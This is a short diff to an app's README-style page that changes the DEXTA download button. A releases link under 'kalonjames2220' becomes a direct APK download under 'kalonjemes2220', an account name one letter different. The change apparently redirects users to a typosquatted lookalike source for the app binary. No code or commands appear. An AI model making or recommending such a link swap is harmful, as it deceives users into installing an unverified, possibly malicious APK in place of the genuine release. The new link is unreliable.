@@ -328,5 +328,5 @@ other sensitive information in public issues.**
 **Free to use · No in-app ads · Built-in protection**
 
 [⬇️ Download
-DEXTA](https://github.com/kalonjames2220/DEXTA-Updates/releases/latest)
+DEXTA](https://github.com/kalonjemes2220/DEXTA-Updates/releases/download/v2.1.5/DEXTA-Browser.apk)
 :::
